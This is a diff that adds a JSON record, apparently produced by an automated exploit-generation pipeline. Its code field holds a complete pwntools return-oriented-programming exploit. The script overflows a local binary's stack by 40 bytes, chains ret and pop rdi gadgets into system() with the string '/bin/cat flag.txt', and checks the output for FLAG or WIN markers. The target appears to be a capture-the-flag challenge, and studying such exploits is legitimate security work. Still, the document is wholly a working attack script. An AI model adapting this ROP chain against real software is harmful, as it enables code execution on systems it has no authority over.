@@ -1,0 +1,7 @@
+{
+  "strategy": "heuristic_split",
+  "code": "import argparse\nimport re\nfrom pwn import ELF, ROP, context, p64, process\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"binary\", nargs=\"?\", default=None)\n    parser.add_argument(\"--binary\", dest=\"binary_flag\", default=None)\n    args = parser.parse_args()\n    binary = args.binary_flag or args.binary\n    if not binary:\n        raise SystemExit(\"missing binary path\")\n\n    elf = ELF(binary, checksec=False)\n    context.binary = elf\n    rop = ROP(elf)\n\n    pop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\n    ret = rop.find_gadget([\"ret\"]).address\n    system = elf.plt.get(\"system\") or elf.symbols.get(\"system\")\n    string_addr = next(elf.search(b\"/bin/cat flag.txt\"))\n    offset = 40\n\n    payload = b\"A\" * offset + p64(ret) + p64(pop_rdi) + p64(string_addr) + p64(system)\n\n    io = process(binary)\n    io.sendline(payload)\n    output = io.recvall(timeout=2).decode(errors=\"replace\")\n    print(output)\n\n    if re.search(r\"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b\", output):\n        return\n    raise SystemExit(1)\n\n\nif __name__ == \"__main__\":\n    main()\n",
+  "success_conditions": "Send extracted candidate input and observe WIN/FLAG markers.",
+  "raw_text": "heuristic_pre_llm_attempt",
+  "used_format_repair": false
+}
